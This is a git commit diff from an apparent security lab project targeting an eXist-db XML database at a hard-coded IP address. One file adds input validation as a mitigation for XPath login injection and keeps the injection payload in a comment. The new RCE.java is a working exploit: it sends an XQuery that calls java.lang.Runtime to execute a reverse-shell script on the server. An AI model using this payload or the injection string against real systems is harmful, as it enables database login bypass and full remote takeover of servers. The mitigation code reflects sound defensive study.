ccf3bce8d46cba07df6f1ec04d9b96ddf6478609
SB <19587870+soonloh@users.noreply.github.com>
2018-11-18 18:06:01 +0800

    Completed RCE exploit
    Added Validation as mitigation

--- src/LoginBypass.java
+++ src/LoginBypass.java
@@ -1,39 +1,82 @@
-import org.exist.xmldb.EXistXQueryService;
 import org.xmldb.api.DatabaseManager;
 import org.xmldb.api.base.Collection;
-import org.xmldb.api.base.CompiledExpression;
 import org.xmldb.api.base.Database;
-import org.xmldb.api.base.Resource;
 import org.xmldb.api.base.ResourceIterator;
 import org.xmldb.api.base.ResourceSet;
-import org.xmldb.api.modules.XMLResource;
 import org.xmldb.api.modules.XPathQueryService;
+
+import java.util.regex.Pattern;
 
 public class LoginBypass {
     protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
     protected static String URI = "xmldb:exist://13.70.19.195:8080/exist/xmlrpc";
-    protected static String collectionPath = "/db/vulnapp";
+    protected static String collectionPath = "/db/vulnapp/";
     protected static String resourceName = "user.xml";
+    public static Collection col = null;
 
     public static void main(String[] args) throws Exception {
-
-        //User Input
-        String username = "mjane";
-        //Bypass Login
-        //username = "mjane\" or .=\"";
-        String password = "pass1234";
-
-        // initialize database driver
         Class cl = Class.forName(DRIVER);
         Database database = (Database) cl.newInstance();
         DatabaseManager.registerDatabase(database);
 
         // get the collection
-        Collection col = DatabaseManager.getCollection(URI + collectionPath);
+        col = DatabaseManager.getCollection(URI + collectionPath);
+
+        try {
+            exploit();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public static void  exploit() throws Exception{
+        //Normal Username
+        String username = "mjane";
+        //Exploit Payload
+        //username = "mjane\" or .=\"";
+        String password = "randompassword>";
+
+        if (login_validate(username, password))
+            System.out.println("Login Success");
+        else
+            System.out.println("Login Failed");
+
+    }
+    public static boolean login_validate (String username, String password) throws Exception{
+
+        Pattern username_whitelist_pattern = Pattern.compile("^[a-zA-Z0-9_]*$");
+        Pattern password_blacklist_pattern = Pattern.compile("['\"<>()&%]");
+
+        if(!username_whitelist_pattern.matcher(username).matches()){
+            throw new Exception("Username need to be in alphanumeric characters only");
+        }
+        if(password_blacklist_pattern.matcher(password).find()){
+            throw new Exception("Password must not contain the blacklisted characters.");
+        }
 
         // query a document
         String xQuery = "doc(\"user.xml\")/userlist/user[uname=\""+username+"\" and password=\""+password+"\"]";
-        System.out.println("Execute xQuery = " + xQuery);
+        //System.out.println("Execute xQuery = " + xQuery);
+
+        XPathQueryService xpqs = (XPathQueryService)col.getService("XPathQueryService", "3.1");
+
+        xpqs.setProperty("indent", "yes");
+
+        // Execute the query, print the result
+        ResourceSet result = xpqs.query(xQuery);
+        ResourceIterator i = result.getIterator();
+//        while (i.hasMoreResources()) {
+//            Resource r = i.nextResource();
+//            System.out.println((String) r.getContent());
+//        }
+        return i.hasMoreResources();
+    }
+
+    public static boolean login (String username, String password) throws Exception{
+
+        // query a document
+        String xQuery = "doc(\"user.xml\")/userlist/user[uname=\""+username+"\" and password=\""+password+"\"]";
+        //System.out.println("Execute xQuery = " + xQuery);
 
         XPathQueryService xpqs = (XPathQueryService)col.getService("XPathQueryService", "3.0");
         xpqs.setProperty("indent", "yes");
@@ -45,9 +88,6 @@ public class LoginBypass {
 //            Resource r = i.nextResource();
 //            System.out.println((String) r.getContent());
 //        }
-        if (i.hasMoreResources())
-            System.out.println("Login Successful");
-        else
-            System.out.println("Login Failed");
+        return i.hasMoreResources();
     }
 }
---
+++ src/RCE.java
@@ -0,0 +1,51 @@
+import org.xmldb.api.DatabaseManager;
+import org.xmldb.api.base.*;
+import org.xmldb.api.modules.XPathQueryService;
+
+public class RCE {
+    protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
+    protected static String URI = "xmldb:exist://13.70.19.195:8080/exist/xmlrpc";
+    protected static String collectionPath = "/db/vulnapp/";
+    protected static String resourceName = "user.xml";
+    public static Collection col = null;
+
+    public static void main(String[] args) throws Exception {
+        Class cl = Class.forName(DRIVER);
+        Database database = (Database) cl.newInstance();
+        DatabaseManager.registerDatabase(database);
+
+        // get the collection
+        col = DatabaseManager.getCollection(URI + collectionPath);
+        try {
+            exploit();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public static void  exploit() throws Exception{
+        String exploit_query = "declare namespace runtime =\"java:java.lang.Runtime\"; declare variable $rt:= runtime:get-runtime(); runtime:exec($rt, \"/bin/bash /opt/eXist-db/webapp/WEB-INF/data/fs/db/vulnapp/rev_shell.sh\")";
+        //Finding the password length
+        System.out.println(query(exploit_query));
+    }
+
+    public static String query (String query) throws Exception{
+
+        // query a document
+        System.out.println("Execute xQuery = " + query);
+
+        XPathQueryService xpqs = (XPathQueryService)col.getService("XPathQueryService", "3.0");
+        xpqs.setProperty("indent", "yes");
+
+
+        // Execute the query, print the result
+        ResourceSet result = xpqs.query(query);
+        ResourceIterator i = result.getIterator();
+        StringBuffer bf = new StringBuffer();
+        while (i.hasMoreResources()) {
+           Resource r = i.nextResource();
+            bf.append((String) r.getContent());
+        }
+        return bf.toString();
+    }
+}
